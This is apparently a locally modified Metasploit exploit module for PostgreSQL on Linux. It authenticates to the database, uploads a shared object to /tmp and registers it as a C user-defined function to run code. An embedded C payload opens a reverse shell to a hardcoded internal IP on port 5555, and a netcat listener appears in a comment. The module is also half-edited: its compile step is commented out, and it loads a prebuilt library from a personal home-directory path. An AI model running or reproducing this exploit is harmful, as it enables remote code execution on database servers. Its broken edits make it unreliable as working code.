##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/postgres'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Postgres
  include Msf::Auxiliary::Report

  # Creates an instance of this module.
  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PostgreSQL for Linux Payload Execution',
      'Description'    => %q{
        On some default Linux installations of PostgreSQL, the
        postgres service account may write to the /tmp directory, and
        may source UDF Shared Libraries's from there as well, allowing
        execution of arbitrary code.

        This module compiles a Linux shared object file, uploads it to
        the target host via the UPDATE pg_largeobject method of binary
        injection, and creates a UDF (user defined function) from that
        shared object. Because the payload is run as the shared object's
        constructor, it does not need to conform to specific Postgres
        API versions.
      },
      'Author'         =>
      [
        'midnitesnake', # this Metasploit module
        'egypt',        # on-the-fly compiled .so technique
        'todb'          # original windows module this is based on
      ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt' ]
        ],
      'Platform'       => 'linux',
      'Payload'        =>
        {
          'Space'    => 65535,
          'DisableNops'  => true,
        },
      'Targets'        =>
        [
          [ 'Linux x86',       { 'Arch' => ARCH_X86 } ],
          [ 'Linux x86_64',    { 'Arch' => ARCH_X64 } ],
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => 'Jun 05 2007'

      ))

    deregister_options('SQL', 'RETURN_ROWSET')
  end

  def check
    version = postgres_fingerprint

    if version[:auth]
      return CheckCode::Appears
    else
      print_error "Authentication failed. #{version[:preauth] || version[:unknown]}"
      return CheckCode::Safe
    end
  end

  def exploit
    version = do_login(username,password,database)
    case version
    when :noauth; print_error "Authentication failed."; return
    when :noconn; print_error "Connection failed."; return
    else
      print_status("#{rhost}:#{rport} - #{version}")
    end

    fname = "/tmp/libhello.so"

    unless postgres_upload_binary_data(payload_so(fname), fname)
      print_error "Could not upload the UDF SO"
      return
    end

    begin
      func_name = Rex::Text.rand_text_alpha(10)
#      postgres_query(
#        "create or replace function pg_temp.examp()"+
#        " returns void as '#{fname}','func_name'"+
#        " language c strict immutable"
#      )
      postgres_query(
        "create or replace function pg_temp.examp()"+
        " returns void as '/tmp/libhello.so','add_one12'"+
        " language c strict immutable"
      )
    print_status "calling select xxx(2)"
	postgres_query("select pg_temp.examp()")
    #`nc -l 5555`
    rescue RuntimeError => e
      print_error "Failed to create UDF function: #{e.class}: #{e}"
    end
    postgres_logout if @postgres_conn

  end

  # Authenticate to the postgres server.
  #
  # Returns the version from #postgres_fingerprint
  def do_login(user=nil,pass=nil,database=nil)
    begin
      password = pass || postgres_password
      vprint_status("Trying #{user}:#{password}@#{rhost}:#{rport}/#{database}")
      result = postgres_fingerprint(
        :db => database,
        :username => user,
        :password => password
      )
      if result[:auth]
        report_service(
          :host => rhost,
          :port => rport,
          :name => "postgres",
          :info => result.values.first
        )
        return result[:auth]
      else
        print_status("Login failed, fingerprint is #{result[:preauth] || result[:unknown]}")
        return :noauth
      end
    rescue Rex::ConnectionError, Rex::Post::Meterpreter::RequestError
      return :noconn
    end
  end


  def payload_so(filename)
    shellcode = Rex::Text.to_hex(payload.encoded, "\\x")
    #shellcode = "\\xcc"

    c = %Q^
    #include<stdio.h>
    #include<stdlib.h>
    #include <unistd.h>
    #include<sys/socket.h>    //socket
    #include<arpa/inet.h> //inet_addr
    #define NULL 0


    int sockfd;         // file descriptor for socket
    int lportno = 5555;    // listener port
    struct sockaddr_in serv_addr; // {2,str[14]}
    char *const params[] = {"/bin/sh",NULL};
    char *const environ[] = {NULL};

    void func_name()
    {
    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    serv_addr.sin_family = AF_INET; // 2
    serv_addr.sin_addr.s_addr = inet_addr("10.52.1.15"); // localhost
    serv_addr.sin_port = htons(lportno);  // little endian
    connect(sockfd, (struct sockaddr *) &serv_addr, 16);
    // redirect stdout and stderr
    dup2(sockfd,0); // stdin
    dup2(0,1); // stdout
    dup2(0,2); // stderr
    execve("/bin/sh",params,environ);
    }
    ^

    cpu = case target_arch.first
      when ARCH_X86; Metasm::Ia32.new
      when ARCH_X64; Metasm::X86_64.new
      end
    #payload_so = Metasm::ELF.compile_c(cpu, c, "payload.c")
    #strF = Metasm::VirtualFile.read("/home/rohini/Documents/metasploit-framework/modules/exploits/linux/postgres/libExploit.so", "rb")
    file = File.open("/home/rohini/Documents/metasploit-framework/modules/exploits/linux/postgres/libhello.so", "rb")
    data = file.read
    file.close
    so_file = data
    so_file
  end
end
